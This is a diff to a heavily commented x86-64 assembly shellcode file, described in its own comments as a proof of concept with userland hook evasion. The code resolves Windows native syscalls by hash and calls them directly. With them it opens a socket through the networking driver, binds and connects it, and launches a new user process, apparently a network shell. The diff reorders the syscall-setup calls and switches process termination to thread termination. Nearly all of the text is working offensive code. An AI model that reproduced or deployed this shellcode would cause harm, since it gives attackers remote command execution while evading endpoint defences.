@@ -4,9 +4,9 @@ BITS 64
 ;
 ; This proof-of-concept is designed to execute
 ; standalone with userland hook evasion. Also,
-; I designed this shellcode to be as verbose
-; as possible. People with no prior assembly
-; experience should be able to follow.
+; I designed this shellcode to be as verbose as
+; possible. People with no prior experience in
+; assembly should be able to follow.
 ;
 ;                .,u%:;-..
 ;             ,d$$$$7^^?$i;.
@@ -44,10 +44,6 @@ BITS 64
 
 SYSCALLS:
 
-        MOV     ECX,    DWORD   [RBP + 0x38]
-        MOV     RDX,    QWORD   [RBP + 0x30]
-        CALL    SET_SYSCALL
-
 ; Creating a socket requires requesting a file
 ; handle from the networking driver. NtCreateFile
 ; requires 11 parameters.
@@ -68,6 +64,10 @@ SYSCALLS:
 ; allocation size and file attributes.
 
 RUN_NTCREATEFILE:
+        MOV     ECX,    DWORD   [RBP + 0x38]
+        MOV     RDX,    QWORD   [RBP + 0x30]
+        CALL    SET_SYSCALL
+
         PUSH    0
         MOV     RCX,    RSP
         MOV     RDX,    0xC0100000
@@ -127,10 +127,6 @@ RUN_NTCREATEFILE:
         CMP     RAX,    0
         JNZ     RUN_NTTERMINATEPROCESS
 
-        MOV     ECX,    [RBP + 0x18]
-        MOV     RDX,    [RBP + 0x10]
-        CALL    SET_SYSCALL
-
 ; NtDeviceIoControlFile requires 10 parameters.
 ; A bind must come before a connection.
 ;
@@ -149,6 +145,10 @@ RUN_NTCREATEFILE:
 ; zero.
 
 RUN_NTBIND:
+        MOV     ECX,    [RBP + 0x18]
+        MOV     RDX,    [RBP + 0x10]
+        CALL    SET_SYSCALL
+
         MOV     RCX,    QWORD   [RSP]
         XOR     RDX,    RDX
         XOR     R8,     R8
@@ -180,10 +180,6 @@ RUN_NTBIND:
         CMP     RAX,    0
         JNZ     RUN_NTTERMINATEPROCESS
 
-        MOV     ECX,    DWORD   [RBP + 0x18]
-        MOV     RDX,    QWORD   [RBP + 0x10]
-        CALL    SET_SYSCALL
-
 ; Connecting.
 ;
 ; RCX                           => Pointer to handle.
@@ -201,6 +197,10 @@ RUN_NTBIND:
 ; buffer/length may all be zero.
 
 RUN_NTCONNECT:
+        MOV     ECX,    DWORD   [RBP + 0x18]
+        MOV     RDX,    QWORD   [RBP + 0x10]
+        CALL    SET_SYSCALL
+
         MOV     RCX,    QWORD   [RSP]
         XOR     RDX,    RDX
         XOR     R8,     R8
@@ -234,10 +234,6 @@ RUN_NTCONNECT:
         CMP     RAX,    0
         JNZ     RUN_NTTERMINATEPROCESS
 
-        MOV     ECX,    DWORD   [RBP + 0x08]
-        MOV     RDX,    QWORD   [RBP + 0]
-        CALL    SET_SYSCALL
-
 ; NtCreateUserProcess requires 11 parameters. This
 ; is the most bare-bones that I have gotten to work.
 ;
@@ -257,6 +253,10 @@ RUN_NTCONNECT:
 ; buffer/length may all be zero.
 
 RUN_RTLCREATEUSERPROCESSPARAMS:
+        MOV     ECX,    DWORD   [RBP + 0x08]
+        MOV     RDX,    QWORD   [RBP + 0]
+        CALL    SET_SYSCALL
+
         PUSH    0
         PUSH    0
         PUSH    0
@@ -296,11 +296,11 @@ RUN_RTLCREATEUSERPROCESSPARAMS:
 
         ADD     RSP,    0xC0
 
+RUN_NTCREATEUSERPROCESS:
         MOV     ECX,    DWORD   [RBP + 0x28]
         MOV     RDX,    QWORD   [RBP + 0x20]
         CALL    SET_SYSCALL
 
-RUN_NTCREATEUSERPROCESS:
         SUB     RSP,    0x10
         MOV     RAX,    QWORD   [RSP]
         MOV     RCX,    0xFFFFFFFFFFFFFFFD
@@ -352,11 +352,11 @@ RUN_NTCREATEUSERPROCESS:
 
         ADD     RSP,    0x130
 
+RUN_NTTERMINATEPROCESS:
         MOV     ECX,    DWORD   [RBP + 0x48]
         MOV     RDX,    QWORD   [RBP + 0x40]
         CALL    SET_SYSCALL
 
-RUN_NTTERMINATEPROCESS:
         MOV     RCX,    0xFFFFFFFFFFFFFFFF
         XOR     RDX,    RDX
         CALL    RUN_SYSCALL
@@ -399,19 +399,19 @@ INIT_NTDLL_API:
         CALL    GET_NTDLL
         MOV     QWORD   [RBP + 0x70],   RAX
 
-GET_NTTERMINATEPROCESS:
-        MOV     RCX,    QWORD   [RBP + 0x70]
-        MOV     RDX,    0x618D8E8F
-        LEA     R8,     QWORD   [RBP + 0x48]
-        LEA     R9,     QWORD   [RBP + 0x40]
-        CALL    FIND_SYSCALL
-
-; GET_NTTERMINATETHREAD:
-;         MOV     RCX,    QWORD   [RBP + 0x60]
-;         MOV     RDX,    0x3ECF2582
+; GET_NTTERMINATEPROCESS:
+;         MOV     RCX,    QWORD   [RBP + 0x70]
+;         MOV     RDX,    0x618D8E8F
 ;         LEA     R8,     QWORD   [RBP + 0x48]
 ;         LEA     R9,     QWORD   [RBP + 0x40]
 ;         CALL    FIND_SYSCALL
+
+GET_NTTERMINATETHREAD:
+        MOV     RCX,    QWORD   [RBP + 0x60]
+        MOV     RDX,    0x3ECF2582
+        LEA     R8,     QWORD   [RBP + 0x48]
+        LEA     R9,     QWORD   [RBP + 0x40]
+        CALL    FIND_SYSCALL
 
 GET_NTCREATEFILE:
         MOV     RCX,    QWORD   [RBP + 0x70]
